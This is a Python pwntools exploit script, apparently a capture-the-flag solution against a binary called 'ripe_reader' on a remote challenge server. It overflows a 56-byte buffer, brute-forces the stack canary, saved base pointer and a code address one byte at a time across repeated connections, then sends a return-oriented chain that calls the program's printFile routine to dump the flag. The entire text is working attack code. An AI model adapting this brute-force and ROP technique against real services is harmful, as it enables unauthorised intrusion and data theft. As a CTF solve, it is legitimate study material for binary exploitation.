from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './ripe_reader'
HOST = 'four.jh2i.com'
PORT = 50023
HOST = 'three.jh2i.com'
PORT = 50023

# HOST = 'localhost'
# PORT = 1234

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


canary = '\x00'
canary = '\x00\x7f\x3d\xc3\x99\xde\x8a\xf9' 
while(len(canary) < 8):
    payload = 'A'*56
    for i in range(0x100): 
        temp = chr(i)
        r = start()
        r.sendafter('QUIT\n', payload + canary + temp)
        try:
            r.recvuntil('Select')
            break
        except:
            r.close()
            continue

    r.close()
    canary += temp
    print "canary:", canary

rbp = ''
rbp = '\x54\x48\xfa\xbc\xfe\x7f\x00\x00'
while(len(rbp) < 8):
    payload = 'A'*56+canary
    for i in range(0x100): 
        temp = chr(i)
        r = start()
        r.sendafter('QUIT\n', payload + rbp + temp)
        text = r.recvrepeat(0.5)
        r.close()
        if 'Select' in text:
            break
        else:
            continue

    rbp += temp
    print "rbp:", rbp

pie_leak = '\xc4'
pie_leak = '\xc4\x7d\x1e\xcf\xd3\x55\x00\x00'

while(len(pie_leak) < 8):
    payload = 'A'*56+canary+rbp
    for i in range(0x100): 
        temp = chr(i)
        r = start()
        r.sendafter('QUIT\n', payload + pie_leak + temp)
        try:
            r.recvuntil('Select')
            break
        except:
            r.close()
            continue

    r.close()
    pie_leak += temp
    print "pie_leak:", pie_leak
pie = u64(pie_leak) - 0xdc4
rdi = pie + 0x00001103
rsi_p1 = pie + 0x00001101
dbg('pie')

flag = pie+0x1128

# r.close()
r = start()
payload = 'A'*56
payload += canary
payload += rbp
payload += flat(rdi, 4, rsi_p1, flag, 0xdeadbeef, pie + elf.sym.printFile) 
r.sendafter('QUIT\n', payload)
r.interactive()

